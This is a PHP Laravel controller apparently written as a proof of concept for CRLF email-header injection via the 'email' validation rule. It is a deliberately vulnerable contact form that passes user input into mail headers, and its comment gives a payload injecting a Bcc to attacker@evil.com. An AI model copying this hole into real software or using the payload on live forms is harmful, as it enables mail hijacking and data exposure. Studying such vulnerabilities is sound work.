<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

/**
 * CVE-2026-48019 PoC: CRLF injection in Laravel's default "email" validation
 * rule, combined with Symfony Mailer/Mime header handling.
 *
 * "email" only checks the address format; it does not reject the CRLF
 * sequences (%0D%0A) an attacker can smuggle inside a syntactically valid
 * local-part/domain, letting them inject extra Bcc/headers into the
 * outbound message built from user input.
 *
 * Exploit: submit "email" as
 *   victim@example.com%0D%0ABcc:attacker@evil.com
 * then inspect storage/logs/laravel.log (MAIL_MAILER=log) for the
 * forged Bcc header in the raw outgoing message.
 */
class VulnContactController extends Controller
{
    public function form()
    {
        return response('<form method="POST" action="/contact">'
            .'<input type="hidden" name="_token" value="'.csrf_token().'">'
            .'<input type="text" name="name" placeholder="name">'
            .'<input type="text" name="email" placeholder="email">'
            .'<textarea name="message"></textarea>'
            .'<button type="submit">Send</button>'
            .'</form>');
    }

    public function send(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email',
            'message' => 'required|string|max:2000',
        ]);

        Mail::raw($request->input('message'), function ($mail) use ($request) {
            $mail->to($request->input('email'))
                ->subject('Contact form: '.$request->input('name'));
        });

        return response()->json(['status' => 'sent']);
    }
}
